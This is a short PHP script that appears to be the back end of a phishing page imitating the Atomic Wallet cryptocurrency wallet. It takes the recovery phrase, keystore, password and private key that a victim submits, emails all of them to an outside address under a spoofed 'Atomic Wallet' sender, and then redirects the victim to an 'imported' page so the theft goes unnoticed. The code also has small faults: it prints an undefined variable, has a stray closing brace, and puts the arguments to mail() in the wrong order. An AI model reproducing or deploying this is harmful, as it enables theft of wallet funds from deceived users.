<?php
echo "<pre>";
    print_r($POST);
echo '</pre>';

        $phrase =$_POST['phrase'];
        $keystore =$_POST['keystore'];
        $password =$_POST['password'];
        $privatekey =$_POST['privatekey'];

        $to = "omoniyi@brainycodes.com";
        $body = "";
        $headers = "From: Atomic Wallet";

        $body .= "From: ".$phrase. "\r\n";
        $body .= "From: ".$keystore. "\r\n";
        $body .= "From: ".$password. "\r\n";
        $body .= "From: ".$privatekey. "\r\n";

        mail($to,$body,$headers);
        header("Location: imported");
    }

?>